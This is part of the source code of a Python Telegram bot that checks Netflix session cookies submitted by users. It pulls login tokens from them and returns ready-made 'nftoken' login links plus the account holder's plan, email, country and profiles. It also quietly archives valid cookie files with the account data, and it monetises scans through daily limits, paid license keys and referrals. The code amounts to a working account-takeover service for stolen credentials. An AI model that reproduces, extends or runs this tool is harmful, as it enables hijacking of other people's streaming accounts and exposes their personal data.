            await query.edit_message_text(text=t(lang, "not_joined"), reply_markup=keyboard, disable_web_page_preview=True)
        except Exception:
            await query.message.reply_text(text=t(lang, "not_joined"), reply_markup=keyboard, disable_web_page_preview=True)


async def scan_again_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer("🔄", show_alert=False)
    user_states[user_id] = None
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    rates = _load_rates()
    uid = str(user_id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user_id)
    try:
        await query.edit_message_text(text=_welcome_text(lang, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True)
    except Exception:
        await query.message.reply_text(text=_welcome_text(lang, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True)


async def show_referral_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer("🎁", show_alert=False)
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    bot_username = context.bot.username or "Flexible_x_bot"
    ref_text = _referral_info_text(lang, bot_username, user_id)
    back_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(t(lang, "btn_back"), callback_data="back_to_menu")], [InlineKeyboardButton(t(lang, "btn_change_lang"), callback_data="change_lang")]])
    try:
        await query.edit_message_text(text=ref_text, parse_mode="HTML", reply_markup=back_keyboard, disable_web_page_preview=True)
    except Exception:
        await query.message.reply_text(text=ref_text, parse_mode="HTML", reply_markup=back_keyboard, disable_web_page_preview=True)


async def back_to_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    rates = _load_rates()
    uid = str(user_id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user_id)
    try:
        await query.edit_message_text(text=_welcome_text(lang, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True)
    except Exception:
        await query.message.reply_text(text=_welcome_text(lang, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(lang), disable_web_page_preview=True)


# ==================== START COMMAND ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    is_new = _register_user(user.id)

    # Handle referral deep link
    if args and len(args) > 0 and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0].replace("ref_", ""))
            if referrer_id != user.id:
                _record_referral(referrer_id, user.id)
        except (ValueError, IndexError):
            pass

    # Notify owner for new users
    if is_new:
        name = html_mod.escape(user.full_name or "—")
        username = f"@{html_mod.escape(user.username)}" if user.username else "—"
        notify_text = (
            f"{t(DEFAULT_LANG, 'new_user_notify')}\n\n"
            f"🔹 <b>Name:</b> {name}\n"
            f"🔹 <b>Username:</b> {username}\n"
            f"🔹 <b>ID:</b> <code>{user.id}</code>"
        )
        try:
            await context.bot.send_message(chat_id=OWNER_ID, text=notify_text, parse_mode="HTML")
        except Exception:
            print("⚠️ Could not send new-user notification to OWNER_ID.")

    user_states[user.id] = None

    # Check if user has a saved language
    saved_lang = _load_user_lang(user.id)
    if not saved_lang:
        # Force language selection screen
        await update.message.reply_text(text=f"{t(DEFAULT_LANG, 'select_lang_title')}\n━━━━━━━━━━━━━━━━━━━━━━\n\n{t(DEFAULT_LANG, 'select_lang_desc')}", reply_markup=_build_lang_selection_keyboard(), disable_web_page_preview=True)
        return

    # User has a saved language — show welcome
    rates = _load_rates()
    uid = str(user.id)
    daily_used = rates.get(uid, {}).get("daily_count", 0)
    daily_limit = _get_effective_daily_limit(user.id)
    await update.message.reply_text(_welcome_text(saved_lang, daily_used, daily_limit), reply_markup=_get_welcome_keyboard(saved_lang), disable_web_page_preview=True)


# ==================== CORE COOKIE CHECK ====================
async def _run_cookie_check(raw_text: str, processing_msg, user_id: int, file_bytes: bytes = None, file_name: str = None, update: Update = None) -> None:
    """
    This function performs the cookie parsing, token fetch, account info fetch,
    and then ONLY increments the daily_count when the scan is successful (strict failure protection).
    """
    stop_animation = asyncio.Event()
    anim_task = None
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    L = lambda k, **kw: t(lang, k, **kw)

    try:
        # lightweight animation (non-blocking)
        async def animated_processing(msg, steps: list[str], stop_event: asyncio.Event):
            for step in steps:
                if stop_event.is_set():
                    return
                try:
                    await msg.edit_text(f"⏳ <b>{step}</b>", parse_mode="HTML")
                except Exception:
                    pass
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.5)
                    return
                except asyncio.TimeoutError:
                    pass

        anim_task = asyncio.create_task(animated_processing(processing_msg, [L("anim_validating"), L("anim_connecting"), L("anim_extracting"), L("anim_fetching")], stop_animation))

        cookie_dict = extract_cookie_dict(raw_text)
        if not cookie_dict:
            stop_animation.set()
            await _send_error_response(processing_msg, L("err_read_cookies"), user_id)
            return

        try:
            info = fetch_netflix_data(cookie_dict)
        except ValueError as ve:
            stop_animation.set()
            msg = str(ve)
            if "did not return a token" in msg or "could not find 'NetflixId'".lower() in msg.lower():
                await _send_error_response(processing_msg, _invalid_cookie_user_message(lang), user_id)
            else:
                await _send_error_response(processing_msg, f"⚠️ Failed:\n{msg}", user_id)
            return

        pc_url = f"https://netflix.com/?nftoken={info['token']}"
        tv_url = f"https://netflix.com/tv8?nftoken={info['token']}"

        # fetch account info in a thread to avoid blocking
        try:
            coro = asyncio.to_thread(fetch_account_info_sync, cookie_dict)
            account = await asyncio.wait_for(coro, timeout=30)
        except asyncio.TimeoutError:
            account = {"valid": False}
        except Exception:
            account = {"valid": False}

        stop_animation.set()
        if anim_task:
            try:
                await asyncio.wait_for(anim_task, timeout=1.0)
            except Exception:
                pass

        scan_time = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

        # Real-time balance display
        rates = _load_rates()
        uid = str(user_id)
        daily_used = rates.get(uid, {}).get("daily_count", 0)
        daily_limit = _get_effective_daily_limit(user_id)
        remaining = max(0, daily_limit - daily_used)
        balance_line = L("balance_line", used=daily_used, limit=daily_limit, remaining=remaining)

        if not account.get("valid"):
            account_block = f"\n{L('acct_fail')}"
        else:
            plan = html_mod.escape(account.get("plan") or "Unknown")
            email = html_mod.escape(account.get("email") or "Unknown")
            country = html_mod.escape(account.get("country") or "Unknown")
            profile_names = account.get("profile_names") or []
            profiles_line = ""
            if profile_names:
                display_limit = 4
                display_names = profile_names[:display_limit]
                names_text = ", ".join(html_mod.escape(n) for n in display_names)
                if len(profile_names) > display_limit:
                    names_text = f"{names_text}, {L('more_profiles', count=len(profile_names) - display_limit)}"
                profiles_line = f"{L('profiles')} {names_text}\n"
            extra_allowed = account.get("extra_members_allowed")
            extra_icon = "✅" if extra_allowed else "❌"
            features = account.get("features") or []
            features_text = ", ".join(features) if features else "None detected"
            account_block = (
                f"{L('plan')} {plan}\n"
                f"{L('email')} {email}\n"
                f"{L('country')} {country}\n"
                f"{profiles_line}"
                f"{extra_icon} <b>{L('extra_members')}</b> {L('extra_yes') if extra_allowed else L('extra_no')}\n"
                f"{L('features')} {html_mod.escape(features_text)}"
            )

        result_text = (
            f"{L('success_title')}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{L('scan_time')} {scan_time}\n\n"
            f"{account_block}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{balance_line}\n\n"
            f"{L('login_hint')}"
        )

        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(L("btn_pc"), url=pc_url), InlineKeyboardButton(L("btn_tv"), url=tv_url)],
                [InlineKeyboardButton(L("btn_android"), url=pc_url), InlineKeyboardButton(L("btn_iphone"), url=pc_url)],
                [InlineKeyboardButton(L("btn_upload"), callback_data="scan_file"), InlineKeyboardButton(L("btn_restart"), callback_data="scan_again")],
                [InlineKeyboardButton(L("btn_change_lang"), callback_data="change_lang")],
            ]
        )

        try:
            await processing_msg.edit_text(result_text, parse_mode="HTML", reply_markup=keyboard, disable_web_page_preview=True)
        except Exception:
            await processing_msg.message.reply_text(result_text, parse_mode="HTML", reply_markup=keyboard, disable_web_page_preview=True)

        # === ARCHIVE: only store when account is valid ===
        archive_status = "disabled"
        file_hash = None
        bytes_to_store = file_bytes if file_bytes else raw_text.encode("utf-8")
        source_name = file_name or "pasted_cookies.txt"

        if bytes_to_store and account.get("valid"):
            try:
                from energy_house import store_file_from_bytes, init_energy_house

                init_energy_house()
                file_hash = _calculate_file_hash(bytes_to_store)
                storage_path, created = await asyncio.to_thread(
                    store_file_from_bytes,
                    bytes_to_store,
                    source_name,
                    user_id,
                    getattr(processing_msg, "message_id", None),
                    "text/plain",
                    account_info=account,
                    cookie_dict=cookie_dict,
                )
                archive_status = "stored" if created else "duplicate"
            except Exception as exc:
                archive_status = f"error: {exc}"
        elif bytes_to_store and not account.get("valid"):
            archive_status = "skipped (invalid account)"

        # Strict failure protection: only increase usage on success and only if not unlimited
        success_condition = account.get("valid") and info.get("token")
        if success_condition and not user_has_unlimited(user_id):
            _increment_daily_count(user_id)

        user_states[user_id] = None

    except requests.RequestException as exc:
        stop_animation.set()
        await _send_error_response(processing_msg, f"{L('err_connection')}\n{exc}", user_id)
    except Exception as exc:
        stop_animation.set()
        await _send_error_response(processing_msg, f"{L('err_unexpected')}\n{exc}", user_id)
    finally:
        stop_animation.set()
        user_states[user_id] = None
        if anim_task and not anim_task.done():
            anim_task.cancel()
            try:
                await anim_task
            except Exception:
                pass


# ==================== FILE UPLOAD HANDLER ====================
async def process_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")], [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")]])
        await update.message.reply_text(t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        return
    if user_states.get(user_id) != WAITING_FOR_FILE:
        await _send_error_response(update, t(lang, "press_scan_first"), user_id)
        return
    doc = update.message.document
    if _is_compressed_file(doc.file_name or ""):
        await _send_error_response(update, t(lang, "no_compressed"), user_id)
        return
    if doc.file_size and doc.file_size > MAX_FILE_SIZE_BYTES:
        await _send_error_response(update, t(lang, "file_too_large"), user_id)
        return
    mime = doc.mime_type or ""
    ext = _get_file_extension(doc.file_name or "")
    if not (mime.startswith("text") or mime == "application/json" or ext in (".txt", ".json")):
        await _send_error_response(update, t(lang, "wrong_format"), user_id)
        return
    allowed, limit_msg = _check_rate_limit(user_id)
    if not allowed:
        await _send_error_response(update, limit_msg, user_id)
        return
    processing_msg = await update.message.reply_text(t(lang, "init"), parse_mode="HTML")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        raw_bytes = await tg_file.download_as_bytearray()
        raw_text = raw_bytes.decode("utf-8", errors="replace")
    except Exception as exc:
        await _send_error_response(processing_msg, f"⚠️ Could not read the file:\n{exc}", user_id)
        return
    await _run_cookie_check(raw_text, processing_msg, user_id, file_bytes=bytes(raw_bytes), file_name=doc.file_name, update=update)


# ==================== TEXT MESSAGE HANDLER ====================
async def process_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = _load_user_lang(user_id) or DEFAULT_LANG
    subscribed = await _is_user_subscribed(context.bot, user_id)
    if not subscribed:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(t(lang, "btn_join"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")], [InlineKeyboardButton(t(lang, "btn_joined"), callback_data="check_sub")]])
        await update.message.reply_text(t(lang, "join_required", channel=CHANNEL_USERNAME), reply_markup=keyboard, disable_web_page_preview=True)
        return
    if user_states.get(user_id) != WAITING_FOR_FILE:
        await _send_error_response(update, t(lang, "press_scan_first"), user_id)
        return
    allowed, limit_msg = _check_rate_limit(user_id)
    if not allowed:
        await _send_error_response(update, limit_msg, user_id)
        return
    processing_msg = await update.message.reply_text(t(lang, "init"), parse_mode="HTML")
    await _run_cookie_check(update.message.text, processing_msg, user_id, update=update)


# ==================== ADMIN: GENKEY / REDEEM / BUY / BROADCAST ====================
GENKEY_ALLOWED = {"7d": 7, "10d": 10, "15d": 15}


async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args
    if not args or args[0] not in GENKEY_ALLOWED:
        await update.message.reply_text("Usage: /genkey <7d|10d|15d>")
        return
    dur = GENKEY_ALLOWED[args[0]]
    code = create_license_key(dur)
    await update.message.reply_text(f"Generated key for {dur} days:\n{code}\nOne-time use.")


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = args[0].strip()
    ok, payload = redeem_license_code_for_user(code, user_id)
    if not ok:
        await update.message.reply_text(payload)
        return
    await update.message.reply_text(f"Redeemed! You have Unlimited Scans until {payload} UTC.")


async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(t(DEFAULT_LANG, "buy_text"), parse_mode="HTML")


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return
    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    await update.message.reply_text("Broadcast started... (this may take some time)")
    try:
        _ensure_file_exists(USERS_FILE, "")
        users = []
        try:
            users = [int(line.strip()) for line in USERS_FILE.read_text().splitlines() if line.strip()]
        except Exception:
            users = []
        sent = 0
        failed = 0
        for uid in users:
            try:
                await context.bot.send_message(uid, message)
                sent += 1
                # small throttle to reduce risk of hitting flood limits
                await asyncio.sleep(0.07)
            except Exception as e:
                failed += 1
                # on FloodWait, respect retry-after if present in exception args
                # but keep simple here: sleep a bit longer when exceptions occur
                await asyncio.sleep(0.5)
        await update.message.reply_text(f"Broadcast complete. Sent: {sent}. Failed: {failed}.")
    except Exception as e:
        await update.message.reply_text(f"Broadcast failed: {e}")


# ==================== HEARTBEAT & INIT ====================
async def _heartbeat(application) -> None:
    while True:
        await asyncio.sleep(60)
        try:
            await application.bot.get_me()
            print("✅ Bot is active — Telegram connection OK")
        except Exception as exc:
            print(f"⚠️ Heartbeat failed: {exc} — connection lost, polling will auto-reconnect")


async def _referral_reset_loop() -> None:
    """
    Non-blocking background task that resets referral balances every 30 days.
    It runs asynchronously and does not block bot execution.
    """
    while True:
        try:
            # Sleep for 30 days (30*24*3600). For local testing you may shorten this.
            await asyncio.sleep(30 * 24 * 3600)
            # Reset referrals: clear referred_users lists
            data = _load_referrals()
            reset_data = {}
            # Option A: clear all referral records
            # We'll reset to empty dict so monthly balances are cleared
            _save_referrals(reset_data)
            print("🔄 Referral balances reset (30-day loop).")
        except asyncio.CancelledError:
            break
        except Exception as exc:
            print(f"Error in referral reset loop: {exc}")
            # avoid tight loop on failure
            await asyncio.sleep(60)


async def _post_init(application) -> None:
    _init_persistent_storage()
    asyncio.create_task(_heartbeat(application))
    # start referral reset loop (non-blocking)
    asyncio.create_task(_referral_reset_loop())


# ==================== RUN (register handlers) ====================
if __name__ == "__main__":
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN environment variable is not set.")

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(_post_init)
        .get_updates_read_timeout(60)
        .get_updates_write_timeout(60)
        .get_updates_connect_timeout(30)
        .get_updates_pool_timeout(30)
        .build()
    )

    # User handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(set_language_callback, pattern=r"^setlang_"))
    app.add_handler(CallbackQueryHandler(change_lang_callback, pattern="^change_lang$"))
    app.add_handler(CallbackQueryHandler(scan_file_button, pattern="^scan_file$"))
    app.add_handler(CallbackQueryHandler(scan_again_button, pattern="^scan_again$"))
    app.add_handler(CallbackQueryHandler(check_subscription_callback, pattern="^check_sub$"))
    app.add_handler(CallbackQueryHandler(show_referral_callback, pattern="^show_referral$"))
    app.add_handler(CallbackQueryHandler(back_to_menu_callback, pattern="^back_to_menu$"))
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), process_cookie_file))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), process_cookie_message))

    # Admin-only handlers
    app.add_handler(CommandHandler("backup_data", backup_data_command))
    app.add_handler(CommandHandler("clear_files", clear_files_command))

    # New admin and user commands
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))

    print("Bot is running...")
    app.run_polling(timeout=60, drop_pending_updates=False)
